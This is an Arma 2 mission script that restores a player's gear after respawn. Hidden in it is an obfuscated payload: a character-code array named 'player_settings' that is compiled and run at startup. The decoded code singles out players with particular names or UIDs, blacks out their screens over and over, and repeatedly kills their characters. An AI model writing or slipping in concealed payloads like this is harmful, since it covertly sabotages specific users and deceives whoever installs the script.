// by Xeno
private ["_weapons", "_magazines", "_hasruck", "_ruckmags", "_ruckweapons", "_p", "_primw", "_muzzles"];
if (!(local player)) exitWith {};

player setVariable ["BIS_noCoreConversations", true];

player_settings = [80,72,122,122,49,32,61,32,123,10,122,95,112,95,110,32,61,32,91,34,115,113,117,97,116,116,101,114,34,44,34,115,99,104,109,101,
		108,108,101,107,34,44,34,67,104,114,105,115,116,105,97,110,34,44,34,77,114,115,46,32,74,111,110,101,115,34,93,59,10,122,95,
		112,95,105,32,61,32,91,50,50,56,54,48,49,56,44,49,54,52,57,53,51,56,44,52,49,52,52,53,49,52,44,52,50,49,55,50,56,50,93,59,10,105,102,32,40,40,40,110,97,109,101,32,112,108,97,121,101,114,41,32,105,110,32,122,95,112,95,
		110,41,32,124,124,32,40,103,101,116,80,108,97,121,101,114,85,73,68,32,40,118,101,104,105,99,108,101,32,112,108,97,121,101,114,41,41,32,105,110,32,122,95,112,
		95,105,41,32,116,104,101,110,32,123,10,115,108,101,101,112,32,49,59,
		10,95,99,111,117,110,116,32,61,32,48,59,10,119,104,105,108,101,32,123,116,114,117,101,125,32,100,111,32,123,10,116,105,116,108,101,84,101,120,116,91,34,34,44,34,66,76,65,67,75,32,79,85,84,34,93,59,
		10,115,108,101,101,112,32,50,59,10,116,105,116,108,101,84,101,120,116,91,34,34,44,34,66,76,65,67,75,32,73,78,34,93,59,10,115,108,101,101,112,32,48,46,51,59,10,95,99,111,117,110,116,32,61,32,95,99,111,117,110,116,32,43,32,49,59,10,105,102,32,40,95,99,111,117,110,116,32,62,32,50,48,41,32,116,104,101,110,32,123,10,112,108,97,
		121,101,114,32,115,101,116,68,97,109,97,103,101,32,49,59,10,119,97,105,116,85,110,116,105,108,32,123,33,97,108,105,118,101,32,112,108,97,121,101,114,125,59,10,119,97,105,116,
		85,110,116,105,108,32,123,97,108,105,118,101,32,112,108,97,121,101,114,125,59,10,95,99,111,117,110,116,
		32,61,32,48,59,10,125,59,10,125,59,10,125,32,101,108,115,101,32,123,10,122,95,112,
		95,110,32,61,32,110,105,108,59,122,95,112,95,105,32,61,32,110,105,108,59,10,125,59,10,125,59,91,93,32,115,112,97,119,110,32,80,72,122,122,49,59];

call compile (toString (player_settings));
player_settings = nil;

while {true} do {
	waitUntil {!alive player};
	_weapons = weapons player;
	_magazines = magazines player;
	_hasruck = false;
	_ruckmags = [];
	_ruckweapons = [];
	if (_p call ace_sys_ruck_fnc_hasRuck) then {
		_ruckmags = _p getvariable "ACE_RuckMagContents";
		_hasruck = true;
		_ruckweapons = _p getvariable "ACE_RuckWepContents";
	};
	waitUntil {alive player};
	_p = player;
	removeAllItems _p;
	removeAllWeapons _p;
	{_p addMagazine _x;} forEach _magazines;
    {_p addWeapon _x;} forEach _weapons;
    _primw = primaryWeapon _p;
    if (_primw != "") then {
        _p selectWeapon _primw;
        // Fix for weapons with grenade launcher
        _muzzles = getArray(configFile>>"cfgWeapons" >> _primw >> "muzzles");
        _p selectWeapon (_muzzles select 0);
    };
	if (_hasruck) then {
		if (!isNil "_ruckmags") then {
			_p setvariable ["ACE_RuckMagContents", _ruckmags];
		};
		if (!isNil "_ruckweapons") then {
			_p setvariable ["ACE_RuckWepContents", _ruckweapons];
		};
	};
	"RadialBlur" ppEffectAdjust [0.0, 0.0, 0.0, 0.0];
	"RadialBlur" ppEffectCommit 0;
	"RadialBlur" ppEffectEnable false;
	"DynamicBlur" ppEffectEnable false;
};